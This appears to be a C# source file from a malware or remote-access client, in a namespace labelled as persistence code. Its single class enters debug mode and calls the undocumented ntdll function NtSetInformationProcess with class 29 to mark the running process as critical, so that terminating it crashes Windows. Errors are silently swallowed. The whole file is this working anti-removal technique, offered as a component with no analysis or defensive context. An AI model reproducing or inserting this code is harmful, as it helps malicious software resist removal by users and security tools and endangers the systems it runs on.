using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Persistance
{
    class sysProtrection
    {
        public sysProtrection()
        {
            if (Parametre.SystemProcess_Protect)
                MettreEnCritique(true);
        }

        [DllImport("ntdll.dll", SetLastError = true)]
		extern static unsafe UInt32 NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, void* ProcessInformation, uint ProcessInformationLength);

        public unsafe static void MettreEnCritique(bool enable)
		{
			Process.EnterDebugMode();
			uint ienable = enable ? 1u : 0u;
			try
			{
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, &ienable, sizeof(uint));
			}catch{}
			Process.LeaveDebugMode();
		}
    }
}
